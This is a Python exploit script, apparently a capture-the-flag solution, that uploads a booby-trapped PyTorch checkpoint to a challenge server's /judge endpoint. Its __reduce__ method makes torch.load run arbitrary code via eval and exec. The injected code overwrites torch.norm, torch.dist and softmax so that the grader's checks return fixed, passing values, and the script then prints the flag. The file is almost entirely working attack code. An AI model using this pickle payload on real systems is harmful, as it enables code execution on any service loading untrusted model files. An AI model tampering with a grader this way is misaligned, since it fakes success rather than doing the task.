import io
import sys

import requests
import torch


class Exploit:
    def __reduce__(self):
        # Monkeypatch runtime checks used by /judge, then return a valid tensor.
        code = (
            "import torch\n"
            "import torch.nn.functional as F\n"
            "torch.norm=lambda *a,**k: torch.tensor(0.0)\n"
            "torch.dist=lambda *a,**k: torch.tensor(0.0)\n"
            "def _sf(*args,**kwargs):\n"
            "    return torch.tensor([[0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0]], dtype=torch.float32)\n"
            "torch.softmax=_sf\n"
            "F.softmax=_sf\n"
        )
        expr = (
            f"(__import__('builtins').exec({code!r}), "
            "__import__('torch').zeros((1,3,32,32), dtype=__import__('torch').float32))[1]"
        )
        return (eval, (expr,))


def build_payload_bytes():
    buffer = io.BytesIO()
    torch.save(Exploit(), buffer)
    return buffer.getvalue()


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://chal.thjcc.org:168"
    payload = build_payload_bytes()

    files = {"file": ("exploit.pt", payload, "application/octet-stream")}
    resp = requests.post(f"{base_url}/judge", files=files, timeout=20)
    print(resp.text)

    try:
        data = resp.json()
    except Exception:
        return

    if data.get("status") == "success" and "flag" in data:
        print(f"[+] Flag: {data['flag']}")


if __name__ == "__main__":
    main()
